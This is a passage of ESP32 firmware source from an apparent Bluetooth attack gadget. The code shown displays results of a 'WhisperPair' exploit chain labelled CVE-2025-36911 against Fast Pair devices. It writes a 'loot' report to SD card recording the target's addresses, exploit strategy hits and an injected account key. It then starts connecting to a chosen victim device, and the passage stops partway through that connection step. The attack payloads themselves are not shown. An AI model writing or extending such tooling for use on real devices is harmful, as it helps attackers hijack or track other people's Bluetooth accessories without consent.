rgomez31UAQ/ESP32-DIV_CYD-Gadget/bluetooth_attacks.cpp
        y += 6;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Firmware: ");
        if (wpAtkResult.hasFirmware) {
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.print(wpAtkResult.firmware);
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.print("Unknown");
        }
        y += 14;

        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Model ID: ");
        if (wpAtkResult.hasModelId) {
            tft.setTextColor(HALEHOUND_HOTPINK);
            char midStr[12];
            snprintf(midStr, sizeof(midStr), "0x%02X%02X%02X",
                     wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
                     wpAtkResult.modelIdBytes[2]);
            tft.print(midStr);
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            char mhex[12];
            snprintf(mhex, sizeof(mhex), "0x%06X", d.modelId);
            tft.print(mhex);
        }
    }

    // Bottom navigation bar
    tft.drawLine(0, SCREEN_HEIGHT - 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_DARK);

    // SAVE button (left)
    tft.fillRoundRect(5, SCREEN_HEIGHT - 34, 70, 26, 4, HALEHOUND_DARK);
    tft.drawRoundRect(4, SCREEN_HEIGHT - 35, 72, 28, 4, HALEHOUND_MAGENTA);
    tft.drawBitmap(10, SCREEN_HEIGHT - 29, bitmap_icon_save, 16, 16, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(30, SCREEN_HEIGHT - 25);
    tft.print("SAVE");

    // Page nav (right)
    tft.setTextColor(HALEHOUND_VIOLET);
    if (atkResultPage == 0) {
        tft.setCursor(SCREEN_WIDTH - 55, SCREEN_HEIGHT - 25);
        tft.print("1/2");
        tft.drawBitmap(SCREEN_WIDTH - 22, SCREEN_HEIGHT - 29, bitmap_icon_RIGHT, 16, 16, HALEHOUND_VIOLET);
    } else {
        tft.drawBitmap(SCREEN_WIDTH - 60, SCREEN_HEIGHT - 29, bitmap_icon_LEFT, 16, 16, HALEHOUND_VIOLET);
        tft.setCursor(SCREEN_WIDTH - 38, SCREEN_HEIGHT - 25);
        tft.print("2/2");
    }
}

// ─── SD Card Loot Save ──────────────────────────────────────────────────
static void wpSaveLoot() {
    if (wpProbeIdx < 0) return;
    FPDevice& d = wpDevs[wpProbeIdx];

    spiDeselect();
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    if (!SD.begin(SD_CS)) {
        SPI.begin(18, 19, 23, SD_CS);
        if (!SD.begin(SD_CS, SPI, 4000000)) {
            tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
            tft.setTextColor(0xF800);
            tft.setCursor(10, SCREEN_HEIGHT - 52);
            tft.print("SD card not found!");
            SD.end();
            return;
        }
    }

    if (!SD.exists("/wp_loot")) {
        SD.mkdir("/wp_loot");
    }

    char safeMac[18];
    strncpy(safeMac, d.addrStr, 17);
    safeMac[17] = '\0';
    for (int i = 0; i < 17; i++) {
        if (safeMac[i] == ':') safeMac[i] = '-';
    }

    char fname[48];
    snprintf(fname, sizeof(fname), "/wp_loot/%s_%lu.txt", safeMac, millis());

    File f = SD.open(fname, FILE_WRITE);
    if (!f) {
        tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
        tft.setTextColor(0xF800);
        tft.setCursor(10, SCREEN_HEIGHT - 52);
        tft.print("File write failed!");
        SD.end();
        return;
    }

    f.println("========================================");
    f.println("  WHISPERPAIR ATTACK REPORT");
    f.println("  CVE-2025-36911 Exploit Chain");
    f.println("  HaleHound Edition");
    f.println("========================================");
    f.println();
    f.printf("Target:  %s\n", d.name);
    f.printf("BLE MAC: %s\n", d.addrStr);
    f.printf("RSSI:    %d dBm\n", d.rssi);
    f.printf("Model:   0x%06X\n", d.modelId);
    f.println();

    if (wpAtkResult.hasBrEdr) {
        f.printf("BR/EDR Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                 wpAtkResult.brEdrAddr[0], wpAtkResult.brEdrAddr[1],
                 wpAtkResult.brEdrAddr[2], wpAtkResult.brEdrAddr[3],
                 wpAtkResult.brEdrAddr[4], wpAtkResult.brEdrAddr[5]);
    } else {
        f.println("BR/EDR Address: Not extracted");
    }
    f.println();

    f.println("-- Phase 1: KBP Exploit --");
    for (int s = 0; s < 4; s++) {
        const char* status = "N/A";
        if (wpAtkResult.strategyResults[s] == 2) status = "HIT";
        else if (wpAtkResult.strategyResults[s] == 1) status = "MISS";
        f.printf("  %s: %s\n", wpStrategies[s].name, status);
    }
    f.println();

    if (wpAtkResult.kbpRespLen > 0) {
        f.print("KBP Response: ");
        for (size_t i = 0; i < wpAtkResult.kbpRespLen; i++) {
            f.printf("%02X ", wpAtkResult.kbpResp[i]);
        }
        f.println();
    }
    f.println();

    f.println("-- Phase 2: Account Key --");
    if (wpAtkResult.acctKeyWritten) {
        f.print("  Key: ");
        for (int i = 0; i < 16; i++) {
            f.printf("%02X ", wpAtkResult.acctKey[i]);
        }
        f.println();
        f.println("  Status: INJECTED");
    } else {
        f.println("  Status: Not written");
    }
    f.println();

    f.println("-- Phase 3: Intel --");
    f.printf("  Passkey char: %s\n", wpAtkResult.hasPasskey ? "Found" : "Absent");
    f.printf("  AdditionalData: %s\n", wpAtkResult.hasAdditional ? "Found" : "Absent");
    if (wpAtkResult.hasModelId) {
        f.printf("  Model ID: 0x%02X%02X%02X\n",
                 wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
                 wpAtkResult.modelIdBytes[2]);
    }
    if (wpAtkResult.hasFirmware) {
        f.printf("  Firmware: %s\n", wpAtkResult.firmware);
    }
    f.println();
    f.println("========================================");

    f.close();
    SD.end();

    // Show save confirmation on screen
    tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
    tft.setTextColor(0x07E0);
    tft.setCursor(10, SCREEN_HEIGHT - 52);
    tft.print("Saved: ");
    char shortName[28];
    snprintf(shortName, sizeof(shortName), "/wp_loot/%.18s", safeMac);
    tft.print(shortName);
}

// ─── Main Attack Orchestrator ───────────────────────────────────────────
static void wpRunAttack() {
    if (wpProbeIdx < 0 || wpProbeIdx >= wpCount) return;
    FPDevice& d = wpDevs[wpProbeIdx];

    inAttack = true;
    inResult = false;
    wpAtkLogCount = 0;
    memset(&wpAtkResult, 0, sizeof(wpAtkResult));
    wpAtkResult.strategyUsed = -1;

    // Draw attack UI
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.setTextColor(0xF800);
    tft.setCursor(5, 82);
    tft.print("ATTACKING: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    String atkName = String(d.name).substring(0, 16);
    tft.print(atkName);
    tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);

    if (pWpScan) pWpScan->stop();

    wpAtkAddLog("Connecting...", HALEHOUND_HOTPINK);
    wpDrawAtkLog();

    if (!pWpClient) {
        pWpClient = BLEDevice::createClient();
    }
    if (!pWpClient) {
        wpAtkAddLog("Client create FAILED", 0xF800);
        wpDrawAtkLog();
        delay(2000);
        inAttack = false;
        inResult = true;
        wpDrawResult();
        return;
    }

    BLEAddress addr(d.addrStr);
    bool connected = pWpClient->connect(addr, d.addrType);
    if (!connected) {
        wpAtkAddLog("Connection FAILED", 0xF800);
        wpDrawAtkLog();
        delay(2000);
        inAttack = false;
        inResult = true;
        wpDrawResult();
        return;
    }

    wpAtkAddLog("Connected!", HALEHOUND_MAGENTA);
    wpDrawAtkLog();

